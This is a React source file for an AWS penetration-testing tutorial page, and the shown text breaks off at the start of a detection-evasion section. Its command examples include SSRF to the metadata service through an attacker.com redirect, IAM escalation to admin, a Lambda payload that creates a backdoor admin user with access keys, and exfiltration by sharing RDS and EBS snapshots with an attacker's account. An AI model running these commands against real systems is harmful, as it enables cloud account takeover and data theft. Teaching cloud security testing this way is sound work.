
import React from 'react';
import CodeExample from '@/components/CodeExample';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";

const AWSSection: React.FC = () => {
  return (
    <section className="space-y-12">
      <div>
        <h2 className="text-3xl font-bold mb-6">AWS Penetration Testing</h2>
        <p className="mb-8">
          Amazon Web Services (AWS) is the largest cloud service provider with a vast array of services. 
          Penetration testing AWS environments requires understanding specific services, their security models, and common misconfigurations.
        </p>
        
        <Tabs defaultValue="common-vulnerabilities">
          <TabsList>
            <TabsTrigger value="common-vulnerabilities">Common Vulnerabilities</TabsTrigger>
            <TabsTrigger value="testing-approach">Testing Approach</TabsTrigger>
            <TabsTrigger value="tools">Tools</TabsTrigger>
          </TabsList>
          
          <TabsContent value="common-vulnerabilities" className="space-y-6 mt-6">
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">S3 Bucket Misconfigurations</h3>
              <p className="mb-4">
                Simple Storage Service (S3) buckets are frequently misconfigured to allow public access, 
                leading to data exposure. Common issues include:
              </p>
              <ul className="list-disc pl-6 space-y-2">
                <li>Public read/write access to buckets or objects</li>
                <li>Overly permissive bucket policies</li>
                <li>Anonymous access to critical data</li>
                <li>Lack of encryption for sensitive data</li>
                <li>Missing secure transport policies (HTTP vs HTTPS)</li>
                <li>Inadequate logging configuration and monitoring</li>
              </ul>
              
              <h4 className="text-xl font-bold mt-4 mb-2">Testing for S3 Issues</h4>
              <CodeExample 
                language="bash"
                title="Finding Public S3 Buckets"
                code={`# Using AWS CLI to check bucket permissions
aws s3api get-bucket-acl --bucket target-bucket-name

# Using AWS CLI to list objects in a bucket
aws s3 ls s3://target-bucket-name/ --no-sign-request

# Checking bucket policy
aws s3api get-bucket-policy --bucket target-bucket-name

# Using tools like S3Scanner
python3 s3scanner.py --bucket-name target-bucket-name

# Testing for server-side encryption
aws s3api get-bucket-encryption --bucket target-bucket-name

# Finding buckets without secure transport policy
aws s3api get-bucket-policy --bucket target-bucket-name | grep -i "aws:SecureTransport"`}
              />
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">IAM Misconfigurations</h3>
              <p className="mb-4">
                Identity and Access Management (IAM) vulnerabilities can lead to privilege escalation and unauthorized access:
              </p>
              <Accordion type="single" collapsible className="w-full mb-4">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">Excessive IAM Permissions</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Overly permissive IAM policies grant users or roles more permissions than necessary, violating the principle of least privilege.
                    </p>
                    <h5 className="font-semibold mb-2">Examples:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Wildcard permissions (e.g., <code>*</code> for actions or resources)</li>
                      <li>Admin-level permissions for standard users</li>
                      <li>No restriction on what services can be accessed</li>
                    </ul>
                    <CodeExample 
                      language="json"
                      title="Overly Permissive IAM Policy"
                      code={`{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">Privilege Escalation Paths</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Certain combinations of permissions can be exploited to gain higher privileges, even when no single permission seems dangerous.
                    </p>
                    <h5 className="font-semibold mb-2">Common Vectors:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Creating a new policy version with elevated permissions</li>
                      <li>Attaching permissive policies to your own user/role</li>
                      <li>Creating or updating Lambda functions with higher privileges</li>
                      <li>Modifying trust relationships on existing roles</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="IAM Privilege Escalation Example"
                      code={`# Create a new policy version with admin access
aws iam create-policy-version \\
  --policy-arn arn:aws:iam::123456789012:policy/vulnerable-policy \\
  --policy-document file://admin-policy.json \\
  --set-as-default
  
# Exploit pass role permissions to gain higher privileges
aws iam attach-role-policy \\
  --role-name target-lambda-role \\
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">IAM Credential Issues</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Improper management of access keys and credentials can lead to unauthorized access.
                    </p>
                    <h5 className="font-semibold mb-2">Common Issues:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Long-lived access keys without rotation</li>
                      <li>Leaked credentials in code repositories or logs</li>
                      <li>Shared access keys between users or applications</li>
                      <li>Unused but still valid credentials</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Identifying Credential Issues"
                      code={`# Check for old access keys
aws iam list-access-keys --user-name target-user --query 'AccessKeyMetadata[*].[UserName,AccessKeyId,CreateDate,Status]' --output table

# Check credentials report for unused credentials
aws iam generate-credential-report
aws iam get-credential-report --output text --query Content | base64 -d

# Search git repositories for leaked keys (using trufflehog)
trufflehog --regex --entropy=False https://github.com/example/repo`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">EC2 Security Issues</h3>
              <p className="mb-4">
                Elastic Compute Cloud (EC2) instances can have several security issues:
              </p>
              <Accordion type="single" collapsible className="w-full mb-4">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">Security Group Misconfigurations</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Security groups act as virtual firewalls for EC2 instances. Misconfigurations can expose services to unauthorized access.
                    </p>
                    <h5 className="font-semibold mb-2">Common Issues:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Overly permissive inbound rules (0.0.0.0/0)</li>
                      <li>Unnecessary ports exposed to the internet</li>
                      <li>Missing egress filtering</li>
                      <li>Inconsistent security groups across instances</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Identifying Security Group Issues"
                      code={`# List security groups with open SSH access
aws ec2 describe-security-groups --filters "Name=ip-permission.from-port,Values=22" "Name=ip-permission.cidr,Values=0.0.0.0/0"

# Find instances with public IPs
aws ec2 describe-instances --filters "Name=instance-state-name,Values=running" --query "Reservations[*].Instances[*].{ID:InstanceId,IP:PublicIpAddress,SecurityGroups:SecurityGroups[*]}"

# Identify security groups without egress restrictions
aws ec2 describe-security-groups --query "SecurityGroups[?IpPermissionsEgress[0].IpProtocol=='-1' && IpPermissionsEgress[0].IpRanges[0].CidrIp=='0.0.0.0/0'].{ID:GroupId,Name:GroupName}"`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">Instance Metadata Service (IMDS) Vulnerabilities</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      The EC2 instance metadata service provides information about instances, including sensitive credentials that can be exploited in SSRF attacks.
                    </p>
                    <h5 className="font-semibold mb-2">Attack Vectors:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Server-Side Request Forgery (SSRF) to access IMDS</li>
                      <li>Applications vulnerable to SSRF can leak IAM credentials</li>
                      <li>IMDSv1 is more vulnerable than IMDSv2</li>
                      <li>Pivoting through compromised EC2 instances</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="IMDS Exploitation"
                      code={`# Testing for IMDSv1 (no session required)
curl http://169.254.169.254/latest/meta-data/

# Checking for IAM credentials through IMDS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Getting credentials for a specific role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Testing for SSRF to IMDS using a vulnerable web app
curl -H "X-Forwarded-For: 169.254.169.254" https://vulnerable-app/api/proxy?url=http://169.254.169.254/latest/meta-data/

# IMDSv2 requires session token (more secure)
TOKEN=\`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"\`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">AMI and User Data Vulnerabilities</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Amazon Machine Images (AMIs) and instance user data scripts can contain sensitive information or vulnerabilities.
                    </p>
                    <h5 className="font-semibold mb-2">Security Concerns:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Hardcoded credentials in custom AMIs</li>
                      <li>Use of public AMIs with backdoors or malware</li>
                      <li>Secrets in user data scripts</li>
                      <li>Unpatched vulnerabilities in AMIs</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="AMI and User Data Assessment"
                      code={`# Retrieve user data (may contain secrets)
aws ec2 describe-instance-attribute --instance-id i-1234567890abcdef0 --attribute userData --output text --query "UserData.Value" | base64 -d

# Check AMI details
aws ec2 describe-images --image-ids ami-1234567890abcdef0

# Scan an EC2 instance for vulnerabilities
nmap -sV -p- 10.0.0.1

# Extract and inspect an AMI (requires appropriate tools)
# This is a complex process requiring specialized tools like EC2 Image Builder or forensic tools
aws ec2 create-instance-from-snapshot --snapshot-id snap-1234567890abcdef0 --instance-type t2.micro`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Lambda Function Vulnerabilities</h3>
              <p className="mb-4">
                Serverless Lambda functions may contain vulnerabilities:
              </p>
              <Accordion type="single" collapsible className="w-full mb-4">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">Execution Environment Issues</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      The Lambda execution environment has specific security considerations.
                    </p>
                    <h5 className="font-semibold mb-2">Common Issues:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Insecure handling of temporary files</li>
                      <li>Insufficient memory or execution time limits</li>
                      <li>Vulnerable dependencies in function packages</li>
                      <li>Function code injection vulnerabilities</li>
                    </ul>
                    <CodeExample 
                      language="javascript"
                      title="Vulnerable Lambda Function"
                      code={`// Node.js Lambda with code injection vulnerability
exports.handler = async (event) => {
  const userInput = event.input;
  
  // VULNERABLE: Using eval on user input
  const result = eval(userInput);
  
  return {
    statusCode: 200,
    body: JSON.stringify({ result }),
  };
};`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">Permission and Role Issues</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Lambda functions often have execution roles with excessive permissions.
                    </p>
                    <h5 className="font-semibold mb-2">Security Risks:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Overly permissive IAM execution roles</li>
                      <li>Unnecessary AWS service access</li>
                      <li>Inadequate resource-level permissions</li>
                      <li>Missing condition statements in policies</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Assessing Lambda Permissions"
                      code={`# Get function configuration including role
aws lambda get-function --function-name target-function

# Examine the execution role
aws iam get-role --role-name lambda-execution-role

# List role policies
aws iam list-attached-role-policies --role-name lambda-execution-role

# Get policy details
aws iam get-policy --policy-arn arn:aws:iam::123456789012:policy/lambda-policy
aws iam get-policy-version --policy-arn arn:aws:iam::123456789012:policy/lambda-policy --version-id v1`}
                    />
                  </AccordionContent>
                </AccordionItem>
                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">Event Source Vulnerabilities</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      Lambda triggers and event sources can introduce security vulnerabilities.
                    </p>
                    <h5 className="font-semibold mb-2">Risk Areas:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Unauthenticated API Gateway triggers</li>
                      <li>Public S3 bucket triggers</li>
                      <li>Missing input validation for events</li>
                      <li>Insecure cross-account access</li>
                    </ul>
                    <CodeExample 
                      language="bash"
                      title="Event Source Assessment"
                      code={`# List Lambda event source mappings
aws lambda list-event-source-mappings --function-name target-function

# Check API Gateway configuration for Lambda integrations
aws apigateway get-resources --rest-api-id abcdefgh123

# Examining API Gateway method settings (authentication/authorization)
aws apigateway get-method --rest-api-id abcdefgh123 --resource-id resource123 --http-method GET

# Check S3 bucket trigger configuration
aws s3api get-bucket-notification-configuration --bucket trigger-bucket`}
                    />
                  </AccordionContent>
                </AccordionItem>
              </Accordion>
            </div>
            
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">RDS Database Vulnerabilities</h3>
              <p className="mb-4">
                Relational Database Service (RDS) instances may have security issues:
              </p>
              <ul className="list-disc pl-6 space-y-2">
                <li>Public accessibility enabled</li>
                <li>Weak database credentials</li>
                <li>Missing encryption at rest</li>
                <li>Outdated database versions with known vulnerabilities</li>
                <li>Excessive network access in security groups</li>
                <li>Improper backup configurations</li>
                <li>Insufficient monitoring and logging</li>
              </ul>
              
              <h4 className="text-xl font-bold mt-4 mb-2">Testing RDS Security</h4>
              <CodeExample 
                language="bash"
                title="RDS Security Assessment"
                code={`# List RDS instances and check for public accessibility
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,PubliclyAccessible,Engine,EngineVersion]'

# Check encryption settings
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,StorageEncrypted,KmsKeyId]'

# Examine security group rules for RDS instances
aws ec2 describe-security-groups --group-ids sg-1234567890abcdef0

# Check for automated backups and retention period
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,BackupRetentionPeriod]'`}
              />
            </div>
          </TabsContent>
          
          <TabsContent value="testing-approach" className="space-y-6 mt-6">
            <div className="card">
              <h3 className="text-2xl font-bold mb-4">Step-by-Step AWS Penetration Testing</h3>
              
              <Accordion type="single" collapsible className="w-full">
                <AccordionItem value="item-1">
                  <AccordionTrigger className="text-lg font-medium">1. Reconnaissance</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      The first phase involves identifying AWS resources belonging to the target organization without direct access to their AWS account.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Subdomain enumeration to identify AWS-hosted services</li>
                      <li>Identifying S3 buckets through DNS, certificate transparency logs, and search engines</li>
                      <li>Discovering exposed AWS endpoints and services</li>
                      <li>OSINT techniques to find AWS resource information</li>
                      <li>Searching code repositories for AWS configurations and credentials</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Tools and Techniques:</h5>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-3">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Subdomain Enumeration</h6>
                        <CodeExample 
                          language="bash"
                          title="Subdomain Discovery"
                          code={`# Using Subfinder
subfinder -d example.com -silent | grep aws

# Using Amass
amass enum -d example.com | grep amazonaws.com`}
                        />
                      </div>
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">S3 Bucket Discovery</h6>
                        <CodeExample 
                          language="bash"
                          title="S3 Bucket Enumeration"
                          code={`# Using s3scanner
python3 s3scanner.py --buckets-file wordlist.txt --target-prefix company-name

# Using S3Finder
s3finder -k company-name -r -o results.txt`}
                        />
                      </div>
                    </div>
                    
                    <h5 className="font-semibold mb-2">Expected Outcomes:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>List of AWS resources (S3 buckets, CloudFront distributions, API Gateways)</li>
                      <li>Potential account IDs and region information</li>
                      <li>Understanding of the target's AWS architecture</li>
                      <li>Identification of potential entry points</li>
                    </ul>
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-2">
                  <AccordionTrigger className="text-lg font-medium">2. Initial Access Vector Identification</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      This phase focuses on identifying potential ways to gain initial access to AWS resources.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Testing discovered S3 buckets for public access and permissions</li>
                      <li>Scanning for exposed EC2 instances and misconfigured security groups</li>
                      <li>Checking for vulnerable Lambda functions accessible via API Gateway</li>
                      <li>Testing for SSRF vulnerabilities that could access EC2 metadata service</li>
                      <li>Searching for leaked AWS credentials in code repositories, logs, or error messages</li>
                      <li>Identifying misconfigured public resources (EBS snapshots, RDS instances, etc.)</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Tools and Techniques:</h5>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-3">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">S3 Bucket Testing</h6>
                        <CodeExample 
                          language="bash"
                          title="S3 Access Testing"
                          code={`# List bucket contents without credentials
aws s3 ls s3://target-bucket/ --no-sign-request

# Attempt to upload a test file
aws s3 cp test.txt s3://target-bucket/ --no-sign-request

# Check bucket ACL permissions
aws s3api get-bucket-acl --bucket target-bucket`}
                        />
                      </div>
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">EC2 Exposure Testing</h6>
                        <CodeExample 
                          language="bash"
                          title="EC2 Security Assessment"
                          code={`# Port scanning identified EC2 instances
nmap -sV -p- 54.12.34.56

# Testing for exposed services
nikto -h http://54.12.34.56

# Checking for common web vulnerabilities
nuclei -u http://54.12.34.56 -t cves/`}
                        />
                      </div>
                    </div>
                    
                    <h5 className="font-semibold mb-2">SSRF to Access IMDS:</h5>
                    <CodeExample 
                      language="bash"
                      title="SSRF Testing for IMDS Access"
                      code={`# Basic SSRF test against a vulnerable application
curl -s "https://vulnerable-app.example.com/api?url=http://169.254.169.254/latest/meta-data/"

# More sophisticated SSRF with request redirection
curl -s "https://vulnerable-app.example.com/api?url=http://attacker.com/redirect.php"
# Where redirect.php contains: <?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>

# Testing for DNS rebinding vulnerabilities
# 1. Set up DNS entry that initially resolves to allowed domain, then switches to 169.254.169.254
# 2. Make request through vulnerable application to your controlled domain`}
                    />
                    
                    <h5 className="font-semibold mb-2">Expected Outcomes:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Identification of publicly accessible resources</li>
                      <li>Discovery of misconfigured services</li>
                      <li>Possible AWS credentials or access tokens</li>
                      <li>Understanding of security group configurations</li>
                      <li>Potential SSRF or other vulnerability vectors</li>
                    </ul>
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-3">
                  <AccordionTrigger className="text-lg font-medium">3. Privilege Escalation</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      After gaining initial access, this phase focuses on increasing privileges within the AWS environment.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Enumerating permissions of the compromised credentials</li>
                      <li>Identifying IAM privilege escalation paths</li>
                      <li>Testing for permission misconfigurations</li>
                      <li>Exploiting trust relationships between roles</li>
                      <li>Leveraging service-specific privilege escalation techniques</li>
                      <li>Exploiting resource-based policies</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Common Privilege Escalation Techniques:</h5>
                    <div className="space-y-4 mb-3">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Technique: IAM Policy Manipulation</h6>
                        <p className="text-sm mb-2">If you have permissions to modify policies or create new policy versions:</p>
                        <CodeExample 
                          language="bash"
                          title="IAM Policy Manipulation"
                          code={`# List existing policy versions
aws iam list-policy-versions --policy-arn arn:aws:iam::123456789012:policy/target-policy

# Create a new policy version with admin permissions
cat > admin-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}
EOF

# Update the policy with the new version
aws iam create-policy-version \\
  --policy-arn arn:aws:iam::123456789012:policy/target-policy \\
  --policy-document file://admin-policy.json \\
  --set-as-default`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Technique: Role Assumption Exploitation</h6>
                        <p className="text-sm mb-2">Exploiting trust relationships to assume roles with higher privileges:</p>
                        <CodeExample 
                          language="bash"
                          title="Role Assumption"
                          code={`# Enumerate roles that can be assumed
aws iam list-roles --query "Roles[?AssumeRolePolicyDocument.Statement[?Principal.Service=='ec2.amazonaws.com']]"

# Check if the current identity can assume a role
aws sts get-caller-identity

# Attempt to assume a target role
aws sts assume-role \\
  --role-arn arn:aws:iam::123456789012:role/target-admin-role \\
  --role-session-name privilege-escalation-test
  
# If successful, configure new credentials and verify elevated access
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Technique: Lambda Function Exploitation</h6>
                        <p className="text-sm mb-2">Using Lambda functions to gain higher privileges:</p>
                        <CodeExample 
                          language="bash"
                          title="Lambda Privilege Escalation"
                          code={`# Check current Lambda permissions
aws lambda get-function --function-name target-function

# Identify the execution role
aws iam get-role --role-name lambda-execution-role

# Update Lambda function with malicious code to leverage its role
cat > escalate.py << EOF
import boto3
import json

def lambda_handler(event, context):
    # Create an admin user
    iam = boto3.client('iam')
    response = iam.create_user(UserName='backdoor-admin')
    
    # Attach admin policy
    iam.attach_user_policy(
        UserName='backdoor-admin',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    
    # Create access keys
    keys = iam.create_access_key(UserName='backdoor-admin')
    
    return {
        'statusCode': 200,
        'body': json.dumps(keys['AccessKey'])
    }
EOF

# Update the Lambda function
zip escalate.zip escalate.py
aws lambda update-function-code \\
  --function-name target-function \\
  --zip-file fileb://escalate.zip`}
                        />
                      </div>
                    </div>
                    
                    <h5 className="font-semibold mb-2">Automated Testing Tools:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li><strong>Pacu</strong> - AWS exploitation framework with privilege escalation modules</li>
                      <li><strong>enumeration</strong> - Module for identifying permissions and potential escalation paths</li>
                      <li><strong>privesc</strong> - Module for finding and exploiting privilege escalation paths</li>
                      <li><strong>IAM Privilege Escalation tools</strong> - Open-source tools like AWS Escalate, AWSpx</li>
                    </ul>
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-4">
                  <AccordionTrigger className="text-lg font-medium">4. Lateral Movement</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      This phase involves moving between different AWS accounts, services, or resources after gaining initial access.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Identifying trusted relationships between AWS accounts</li>
                      <li>Moving between accounts using role assumption</li>
                      <li>Exploiting resource sharing configurations</li>
                      <li>Leveraging AWS Organization relationships</li>
                      <li>Using EC2 instances as pivot points</li>
                      <li>Exploiting VPC peering connections</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Lateral Movement Techniques:</h5>
                    <div className="space-y-4 mb-3">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Cross-Account Role Assumption</h6>
                        <p className="text-sm mb-2">Moving between accounts using role assumption:</p>
                        <CodeExample 
                          language="bash"
                          title="Cross-Account Movement"
                          code={`# Identify roles that can be assumed from the current account
aws iam list-roles --query "Roles[?contains(AssumeRolePolicyDocument.Statement[].Principal.AWS, 'arn:aws:iam::CURRENT_ACCOUNT_ID:')]"

# Assume role in another account
aws sts assume-role \\
  --role-arn arn:aws:iam::TARGET_ACCOUNT_ID:role/cross-account-role \\
  --role-session-name lateral-movement-session

# Set new credentials in environment
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# Verify access to new account
aws sts get-caller-identity`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">EC2 Instance Profile Exploitation</h6>
                        <p className="text-sm mb-2">Using EC2 instance profiles to access other services:</p>
                        <CodeExample 
                          language="bash"
                          title="Instance Profile Pivoting"
                          code={`# From within a compromised EC2 instance
# Access instance profile credentials automatically available 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Use these credentials to access other services
# Example: Listing all EC2 instances in the account
aws ec2 describe-instances

# Example: Accessing S3 buckets with instance role
aws s3 ls

# Example: Checking if the role can be used to access RDS instances
aws rds describe-db-instances`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">VPC Peering Exploitation</h6>
                        <p className="text-sm mb-2">Using VPC peering connections to move between environments:</p>
                        <CodeExample 
                          language="bash"
                          title="VPC Peering Movement"
                          code={`# Identify VPC peering connections
aws ec2 describe-vpc-peering-connections

# Get VPC route tables to understand network paths
aws ec2 describe-route-tables

# Scan for hosts in the peered VPC (from a compromised EC2 instance)
nmap -sn 10.0.0.0/16  # Replace with peered VPC CIDR

# Attempt to establish connections to services in the peered VPC
ssh ec2-user@10.0.1.50  # Example IP in peered VPC`}
                        />
                      </div>
                    </div>
                    
                    <h5 className="font-semibold mb-2">AWS Organizations Exploitation:</h5>
                    <CodeExample 
                      language="bash"
                      title="AWS Organizations Movement"
                      code={`# If you have Organizations access, list accounts in the organization
aws organizations list-accounts

# List organizational units
aws organizations list-organizational-units-for-parent --parent-id r-abcd

# Check for service control policies that might restrict movement
aws organizations list-policies --filter SERVICE_CONTROL_POLICY

# List roles that can be assumed across organization accounts
aws iam list-roles --query "Roles[?contains(AssumeRolePolicyDocument.Statement[].Principal.AWS, 'arn:aws:organizations::MASTER_ACCOUNT_ID:')]"`}
                    />
                  </AccordionContent>
                </AccordionItem>

                <AccordionItem value="item-5">
                  <AccordionTrigger className="text-lg font-medium">5. Data Exfiltration Testing</AccordionTrigger>
                  <AccordionContent>
                    <p className="mb-3">
                      This phase tests the ability to extract sensitive data from the AWS environment and evaluates data protection controls.
                    </p>
                    <h5 className="font-semibold mb-2">Key Activities:</h5>
                    <ul className="list-disc pl-6 mb-3 space-y-1">
                      <li>Identifying sensitive data in storage services (S3, EBS, RDS, DynamoDB)</li>
                      <li>Testing encryption controls and key management</li>
                      <li>Evaluating data loss prevention mechanisms</li>
                      <li>Testing CloudTrail and monitoring evasion techniques</li>
                      <li>Assessing network-level data exfiltration controls</li>
                      <li>Identifying data exposure through sharing features</li>
                    </ul>
                    
                    <h5 className="font-semibold mb-2">Common Exfiltration Techniques:</h5>
                    <div className="space-y-4 mb-3">
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">S3 Data Exfiltration</h6>
                        <p className="text-sm mb-2">Extracting data from S3 buckets:</p>
                        <CodeExample 
                          language="bash"
                          title="S3 Data Extraction"
                          code={`# List all buckets accessible to the current identity
aws s3 ls

# Search for buckets with sensitive data
aws s3 ls s3://target-bucket/ --recursive | grep -i password

# Download entire bucket contents
aws s3 sync s3://target-bucket/ ./exfiltrated-data/

# Test for unencrypted data
aws s3 cp s3://target-bucket/sensitive-file.txt - | head

# Check bucket encryption settings
aws s3api get-bucket-encryption --bucket target-bucket`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">Database Exfiltration</h6>
                        <p className="text-sm mb-2">Extracting data from RDS or DynamoDB:</p>
                        <CodeExample 
                          language="bash"
                          title="Database Data Extraction"
                          code={`# For RDS, first identify instances
aws rds describe-db-instances

# Create an RDS database snapshot (if permissions allow)
aws rds create-db-snapshot \\
  --db-instance-identifier target-db \\
  --db-snapshot-identifier exfil-snapshot

# Share snapshot with another account (controlled by attacker)
aws rds modify-db-snapshot-attribute \\
  --db-snapshot-identifier exfil-snapshot \\
  --attribute-name restore \\
  --values-to-add TARGET_ACCOUNT_ID

# For DynamoDB, scan table data
aws dynamodb scan \\
  --table-name sensitive-table \\
  --output json > exfiltrated-dynamodb.json

# Export DynamoDB table to S3 (if permissions allow)
aws dynamodb export-table-to-point-in-time \\
  --table-arn arn:aws:dynamodb:us-west-2:123456789012:table/sensitive-table \\
  --s3-bucket export-bucket \\
  --s3-prefix exports/`}
                        />
                      </div>
                      
                      <div className="bg-cybr-muted/20 p-3 rounded">
                        <h6 className="font-medium mb-1">EBS Volume Exfiltration</h6>
                        <p className="text-sm mb-2">Extracting data from EBS volumes:</p>
                        <CodeExample 
                          language="bash"
                          title="EBS Data Extraction"
                          code={`# Create snapshot of target volume
aws ec2 create-snapshot \\
  --volume-id vol-1234567890abcdef0 \\
  --description "Exfiltration snapshot"

# Share snapshot with attacker-controlled account
aws ec2 modify-snapshot-attribute \\
  --snapshot-id snap-1234567890abcdef0 \\
  --attribute createVolumePermission \\
  --operation-type add \\
  --user-ids TARGET_ACCOUNT_ID

# In attacker account, create volume from shared snapshot
aws ec2 create-volume \\
  --snapshot-id snap-1234567890abcdef0 \\
  --availability-zone us-west-2a

# Attach volume to attacker-controlled EC2 instance
aws ec2 attach-volume \\
  --volume-id vol-0abcdef1234567890 \\
  --instance-id i-0abcdef1234567890 \\
  --device /dev/sdf

# On the EC2 instance, mount and access the volume data
sudo mkdir /mnt/exfil
sudo mount /dev/xvdf1 /mnt/exfil
sudo ls -la /mnt/exfil`}
                        />
                      </div>
                    </div>
                    
                    <h5 className="font-semibold mb-2">Evading Detection:</h5>
                    <CodeExample 
                      language="bash"
                      title="Detection Evasion"
                      code={`# Check if CloudTrail is enabled
